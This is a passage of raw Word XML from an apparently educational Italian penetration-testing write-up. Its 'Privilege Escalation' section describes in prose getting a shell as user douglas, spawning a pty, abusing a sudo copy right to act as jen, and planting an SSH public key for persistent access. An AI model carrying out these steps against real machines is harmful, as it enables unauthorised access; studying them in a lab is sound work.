          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Privilege</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D2168">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> Escalation) all’interno</w:t>
      </w:r>
      <w:r w:rsidR="00877FB6">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> della stessa macchina target.</w:t>
      </w:r>
      <w:r w:rsidR="00877FB6" w:rsidRPr="00877FB6">
        <w:t xml:space="preserve"> Una volta avuto accesso</w:t>
      </w:r>
      <w:r w:rsidR="00877FB6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00877FB6" w:rsidRPr="00877FB6">
        <w:t>alla macchina in uno dei modi descritti nella sezione precedente è possibile riscontrare che si ottiene l’accesso come utente non privilegiato. Dunque, si è ottenuto l’accesso alla macchina ma in modo limitato, nelle sottosezioni successive viene spiegato come ottenere ulteriori privilegi e come ottenere accesso persistente alla macchina</w:t>
      </w:r>
      <w:r w:rsidR="00877FB6">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CE7E2BA" w14:textId="77777777" w:rsidR="00BA6A2B" w:rsidRDefault="00BA6A2B" w:rsidP="000A5C5D"/>
    <w:p w14:paraId="2F55A433" w14:textId="682A7215" w:rsidR="00BA6A2B" w:rsidRPr="000A6977" w:rsidRDefault="008D2168" w:rsidP="00BA6A2B">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:caps w:val="0"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="30" w:name="_Toc139378621"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>9</w:t>
      </w:r>
      <w:r w:rsidR="00BA6A2B" w:rsidRPr="000A6977">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">.1 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00BA6A2B" w:rsidRPr="000A6977">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:caps w:val="0"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Privilege</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00BA6A2B" w:rsidRPr="000A6977">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:caps w:val="0"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> Escalation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="30"/>
    </w:p>
    <w:p w14:paraId="2D849707" w14:textId="77777777" w:rsidR="00BA6A2B" w:rsidRPr="000A6977" w:rsidRDefault="00BA6A2B" w:rsidP="00BA6A2B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C8E0012" w14:textId="30F27471" w:rsidR="00BA6A2B" w:rsidRDefault="00BA6A2B" w:rsidP="00BA6A2B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BA6A2B">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Sapendo le credenziali dell’utente </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA6A2B">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>ouglas</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">, siamo andati a creare una </w:t>
      </w:r>
      <w:r w:rsidRPr="007E756F">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>shell</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> e poi ad elevarci come </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>douglas</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00D81CA8">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00B66AB1">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> Successivamente, andiamo a </w:t>
      </w:r>
      <w:r w:rsidR="00437A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>elencare i privilegi</w:t>
      </w:r>
      <w:r w:rsidR="00B66AB1">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> associati a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00B66AB1">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>douglas</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00B66AB1">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">. Scopriamo che </w:t>
      </w:r>
      <w:r w:rsidR="007E756F">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">ha i privilegi per effettuare la copia come </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007E756F">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>jen</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007E756F">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C1878F9" w14:textId="719BD6F6" w:rsidR="00D81CA8" w:rsidRPr="00BA6A2B" w:rsidRDefault="00D81CA8" w:rsidP="00BA6A2B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Il </w:t>
      </w:r>
      <w:hyperlink r:id="rId53" w:history="1">
        <w:r w:rsidRPr="00D81CA8">
          <w:rPr>
            <w:rStyle w:val="Collegamentoipertestuale"/>
            <w:color w:val="auto"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t xml:space="preserve">modulo </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D81CA8">
          <w:rPr>
            <w:rStyle w:val="Collegamentoipertestuale"/>
            <w:i/>
            <w:iCs/>
            <w:color w:val="auto"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t>pty</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Collegamentoipertestuale"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve">ci consente di generare uno </w:t>
      </w:r>
      <w:r w:rsidRPr="00D81CA8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>pseudo-terminale</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> che và ad ingannare alcuni comandi, illudendoli che vengano eseguiti in un terminale adeguato.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="491114BE" w14:textId="77777777" w:rsidR="00BA6A2B" w:rsidRDefault="00BA6A2B" w:rsidP="000A5C5D"/>
    <w:p w14:paraId="367A062F" w14:textId="3A7C541E" w:rsidR="00920FBC" w:rsidRPr="000A6977" w:rsidRDefault="007E756F" w:rsidP="000A6977">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251702272" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="36143598" wp14:editId="0780D26E">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>11680</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>312170</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="2649758" cy="153512"/>
                <wp:effectExtent l="0" t="0" r="17780" b="18415"/>
                <wp:wrapNone/>
                <wp:docPr id="1596116932" name="Rettangolo 3"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="2649758" cy="153512"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="25400" cap="flat" cmpd="sng" algn="ctr">
                          <a:solidFill>
                            <a:srgbClr val="00B0F0"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                        </a:ln>
                        <a:effectLst/>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="0459A310" w14:textId="77777777" w:rsidR="007E756F" w:rsidRDefault="007E756F" w:rsidP="007E75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43598" id="_x0000_s1048" style="position:absolute;left:0;text-align:left;margin-left:.9pt;margin-top:24.6pt;width:208.65pt;height:12.1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jeJUQIAAJ4EAAAOAAAAZHJzL2Uyb0RvYy54bWysVEtv2zAMvg/YfxB0X+xkSR9BnSJrkWFA&#10;0QZIh54VWYoNyKJGKbG7Xz9KdpOs22nYRSZFio+PH31z2zWGHRT6GmzBx6OcM2UllLXdFfz78+rT&#10;FWc+CFsKA1YV/FV5frv4+OGmdXM1gQpMqZBREOvnrSt4FYKbZ5mXlWqEH4FTlowasBGBVNxlJYqW&#10;ojcmm+T5RdYClg5BKu/p9r438kWKr7WS4UlrrwIzBafaQjoxndt4ZosbMd+hcFUthzLEP1TRiNpS&#10;0mOoexEE22P9R6imlggedBhJaDLQupYq9UDdjPN33Wwq4VTqhcDx7giT/39h5eNh49ZIMLTOzz2J&#10;sYtOYxO/VB/rElivR7BUF5iky8nF9PpyRuOVZBvPPs/Gk4hmdnrt0IevChoWhYIjDSNhJA4PPvSu&#10;by4xmYVVbUwaiLGspQyzaU4zk4J4oY0IJDauLLi3O86E2RHhZMAU0oOpy/g8BvK4294ZZAcRh55/&#10;yVdpzlTZb24x973wVe+XTEMDxsYwKtFnKPWETpRCt+1YTaVMUs/xagvl6xoZQk8x7+SqpgQPwoe1&#10;QOIUdUJ7Ep7o0AaoPRgkzirAn3+7j/40arJy1hJHqfUfe4GKM/PNEgmux9NpJHVSprPLCSl4btme&#10;W+y+uQNCZEwb6WQSo38wb6JGaF5onZYxK5mElZS7B3lQ7kK/O7SQUi2XyY2I7ER4sBsnY/AIXYT2&#10;uXsR6IbZB2LNI7zxWczfUaD37Umw3AfQdeLHCVfiVVRoCRLDhoWNW3auJ6/Tb2XxCwAA//8DAFBL&#10;AwQUAAYACAAAACEAbpyr39wAAAAHAQAADwAAAGRycy9kb3ducmV2LnhtbEzOwUrDQBAG4LvgOywj&#10;eLObNEGbmE0RQfBQQds+wDY7TYLZ2ZCdtunbO570+PMP/3zVevaDOuMU+0AG0kUCCqkJrqfWwH73&#10;9rACFdmSs0MgNHDFCOv69qaypQsX+sLzllslIxRLa6BjHkutY9Oht3ERRiTpjmHyliVOrXaTvci4&#10;H/QySR61tz3Jh86O+Nph8709eQN+0xQTv7fZ/jNbXTf9jvXRfxhzfze/PINinPnvGH75QodaTIdw&#10;IhfVIFngbCAvlqCkztMiBXUw8JTloOtK//fXPwAAAP//AwBQSwECLQAUAAYACAAAACEAtoM4kv4A&#10;AADhAQAAEwAAAAAAAAAAAAAAAAAAAAAAW0NvbnRlbnRfVHlwZXNdLnhtbFBLAQItABQABgAIAAAA&#10;IQA4/SH/1gAAAJQBAAALAAAAAAAAAAAAAAAAAC8BAABfcmVscy8ucmVsc1BLAQItABQABgAIAAAA&#10;IQClsjeJUQIAAJ4EAAAOAAAAAAAAAAAAAAAAAC4CAABkcnMvZTJvRG9jLnhtbFBLAQItABQABgAI&#10;AAAAIQBunKvf3AAAAAcBAAAPAAAAAAAAAAAAAAAAAKsEAABkcnMvZG93bnJldi54bWxQSwUGAAAA&#10;AAQABADzAAAAtAUAAAAA&#10;" filled="f" strokecolor="#00b0f0" strokeweight="2pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="0459A310" w14:textId="77777777" w:rsidR="007E756F" w:rsidRDefault="007E756F" w:rsidP="007E756F">
                      <w:pPr>
                        <w:jc w:val="center"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>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03749C9B" wp14:editId="4F5C424F">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>238612</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>1713806</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="1448356" cy="133364"/>
                <wp:effectExtent l="0" t="0" r="19050" b="19050"/>
                <wp:wrapNone/>
                <wp:docPr id="178431830" name="Rettangolo 3"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="1448356" cy="133364"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="25400" cap="flat" cmpd="sng" algn="ctr">
                          <a:solidFill>
                            <a:srgbClr val="00B0F0"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                        </a:ln>
                        <a:effectLst/>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="6C920184" w14:textId="77777777" w:rsidR="007E756F" w:rsidRDefault="007E756F" w:rsidP="007E75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49C9B" id="_x0000_s1049" style="position:absolute;left:0;text-align:left;margin-left:18.8pt;margin-top:134.95pt;width:114.05pt;height:10.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ysUwIAAJ4EAAAOAAAAZHJzL2Uyb0RvYy54bWysVEtv2zAMvg/YfxB0X+w8mrVBnSJrkWFA&#10;0QZIh54ZWYoNyJJGKbG7Xz9Kdpqu22nYRSZFio+PH3190zWaHSX62pqCj0c5Z9IIW9ZmX/DvT+tP&#10;l5z5AKYEbY0s+Iv0/Gb58cN16xZyYiurS4mMghi/aF3BqxDcIsu8qGQDfmSdNGRUFhsIpOI+KxFa&#10;it7obJLn86y1WDq0QnpPt3e9kS9TfKWkCI9KeRmYLjjVFtKJ6dzFM1tew2KP4KpaDGXAP1TRQG0o&#10;6WuoOwjADlj/EaqpBVpvVRgJ22RWqVrI1AN1M87fdbOtwMnUC4Hj3StM/v+FFQ/HrdsgwdA6v/Ak&#10;xi46hU38Un2sS2C9vIIlu8AEXY5ns8vpxZwzQbbxdDqdzyKa2fm1Qx++StuwKBQcaRgJIzje+9C7&#10;nlxiMmPXtdZpINqwtuCTi1lOMxNAvFAaAomNKwvuzZ4z0HsinAiYQnqr6zI+j4E87ne3GtkR4tDz&#10;L/k6zZkq+80t5r4DX/V+yTQ0oE0MIxN9hlLP6EQpdLuO1VTKZBqfxKudLV82yND2FPNOrGtKcA8+&#10;bACJU9QJ7Ul4pENpS+3ZQeKssvjzb/fRn0ZNVs5a4ii1/uMAKDnT3wyR4IpmEEmdlNnF5wkp+Nay&#10;e2sxh+bWEiJj2kgnkhj9gz6JCm3zTOu0ilnJBEZQ7h7kQbkN/e7QQgq5WiU3IrKDcG+2TsTgEboI&#10;7VP3DOiG2QdizYM98RkW7yjQ+/YkWB2CVXXixxlX4lVUaAkSw4aFjVv2Vk9e59/K8hcAAAD//wMA&#10;UEsDBBQABgAIAAAAIQCNS7K43wAAAAoBAAAPAAAAZHJzL2Rvd25yZXYueG1sTI/BTsMwDIbvSLxD&#10;ZCRuLKUV3VKaTggJicOQYNsDZI3XVjROlWRb9/aYE9xs+dPv76/XsxvFGUMcPGl4XGQgkFpvB+o0&#10;7HdvDysQMRmyZvSEGq4YYd3c3tSmsv5CX3jepk5wCMXKaOhTmiopY9ujM3HhJyS+HX1wJvEaOmmD&#10;uXC4G2WeZaV0ZiD+0JsJX3tsv7cnp8FtWhXSe1fsP4vVdTPskjy6D63v7+aXZxAJ5/QHw68+q0PD&#10;Tgd/IhvFqKFYlkxqyEulQDCQl09LEAceVKZANrX8X6H5AQAA//8DAFBLAQItABQABgAIAAAAIQC2&#10;gziS/gAAAOEBAAATAAAAAAAAAAAAAAAAAAAAAABbQ29udGVudF9UeXBlc10ueG1sUEsBAi0AFAAG&#10;AAgAAAAhADj9If/WAAAAlAEAAAsAAAAAAAAAAAAAAAAALwEAAF9yZWxzLy5yZWxzUEsBAi0AFAAG&#10;AAgAAAAhAMxc/KxTAgAAngQAAA4AAAAAAAAAAAAAAAAALgIAAGRycy9lMm9Eb2MueG1sUEsBAi0A&#10;FAAGAAgAAAAhAI1LsrjfAAAACgEAAA8AAAAAAAAAAAAAAAAArQQAAGRycy9kb3ducmV2LnhtbFBL&#10;BQYAAAAABAAEAPMAAAC5BQAAAAA=&#10;" filled="f" strokecolor="#00b0f0" strokeweight="2pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="6C920184" w14:textId="77777777" w:rsidR="007E756F" w:rsidRDefault="007E756F" w:rsidP="007E756F">
                      <w:pPr>
                        <w:jc w:val="center"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap anchorx="margin"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00BA6A2B" w:rsidRPr="00BA6A2B">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6E2F283E" wp14:editId="75D62B6A">
            <wp:extent cx="5274310" cy="2028825"/>
            <wp:effectExtent l="0" t="0" r="2540" b="9525"/>
            <wp:docPr id="149156954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9540" name="Immagine 1" descr="Immagine che contiene testo, schermata, Carattere&#10;&#10;Descrizione generata automaticamente"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId54"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5274310" cy="2028825"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="000A6977" w:rsidRPr="006C1913">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Figura 2</w:t>
      </w:r>
      <w:r w:rsidR="000A6977">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidR="000A6977" w:rsidRPr="006C1913">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="000A6977">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">shell e privilegi di </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="000A6977">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>douglas</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="4DE8613C" w14:textId="77777777" w:rsidR="000A6977" w:rsidRPr="00D36206" w:rsidRDefault="000A6977" w:rsidP="000A6977"/>
    <w:p w14:paraId="3D4A2876" w14:textId="21F3555D" w:rsidR="00452DAD" w:rsidRDefault="000A6977" w:rsidP="000A6977">
      <w:r w:rsidRPr="000A6977">
        <w:t>Successivamente, siamo andati ad i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">mmergerci all’interno dell’utente per scoprire nuove informazioni. </w:t>
      </w:r>
      <w:r w:rsidR="00452DAD">
        <w:t>Troviamo una directory .</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00452DAD">
        <w:t>ssh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00452DAD">
        <w:t xml:space="preserve">, stampiamo il suo contenuto e troviamo </w:t>
      </w:r>
      <w:r w:rsidR="00E5623C">
        <w:t>d</w:t>
      </w:r>
      <w:r w:rsidR="00452DAD">
        <w:t>ue file interessanti:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B6EA88B" w14:textId="5732FFD5" w:rsidR="00920FBC" w:rsidRDefault="00452DAD">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Id_rsa</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="7F98EA5B" w14:textId="274E630A" w:rsidR="00452DAD" w:rsidRPr="000A6977" w:rsidRDefault="00452DAD">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Id_rsa.pub</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="593C0950" w14:textId="205097FC" w:rsidR="007E756F" w:rsidRDefault="00E5623C" w:rsidP="00033D6F">
      <w:pPr>
        <w:rPr>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Andiamo a effettuare la stampa di </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>id_rsa.pub</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve"> all’interno di </w:t>
      </w:r>
      <w:r w:rsidRPr="00E5623C">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E5623C">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>tmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E5623C">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E5623C">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>authorizes_key</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve"> e tramite </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E5623C">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>chmod</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve"> cambiamo i permessi associati a quel file, andando a impostare la </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>read</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve"> (4byte) la </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>write</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve"> (2byte) e l’</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>execution</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve"> (1byte) per tutti gli utenti. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F01BA4A" w14:textId="6FCE7D2F" w:rsidR="00920FBC" w:rsidRPr="000A6977" w:rsidRDefault="00E5623C" w:rsidP="00033D6F">
      <w:pPr>
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>In fine</w:t>
      </w:r>
      <w:r w:rsidR="000A6C8E">
        <w:rPr>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="000A6C8E">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">poiché tramite sudo abbiamo i privilegi di copiare il programma che potrebbe essere eseguito come </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="000A6C8E">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>jen</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="000A6C8E">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">, possiamo copiare la chiave pubblica </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="000A6C8E">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>ssh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="000A6C8E">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">, cioè </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="000A6C8E">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>rsa_key</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="000A6C8E">
        <w:rPr>
          <w:color w:val="000000"/>
